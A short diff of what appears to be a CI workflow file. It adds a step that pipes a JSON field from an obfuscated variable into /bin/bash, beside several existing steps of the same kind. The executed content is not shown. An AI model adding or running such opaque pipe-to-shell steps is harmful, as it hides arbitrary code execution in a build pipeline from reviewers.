@@ -31,6 +31,7 @@ jobs:
           echo $q89 | jq -r .rx46 | /bin/bash
           printf '%s' "$srijg32" | jq -r .dw2195 | /bin/bash
           echo $vwam4119 | jq -r .n0 | /bin/bash
+          printf '%s' "$ks3" | jq -r .h64 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
